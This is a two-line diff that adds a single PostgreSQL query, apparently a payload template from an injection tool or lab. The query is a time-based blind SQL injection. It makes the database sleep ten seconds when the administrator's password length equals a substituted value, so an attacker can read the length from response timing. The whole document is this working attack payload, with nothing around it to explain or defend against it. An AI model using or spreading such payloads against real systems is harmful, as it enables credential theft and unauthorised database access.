@@ -1,0 +1,2 @@
+SELECT CASE WHEN (LENGTH(password)={value1}) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'
+
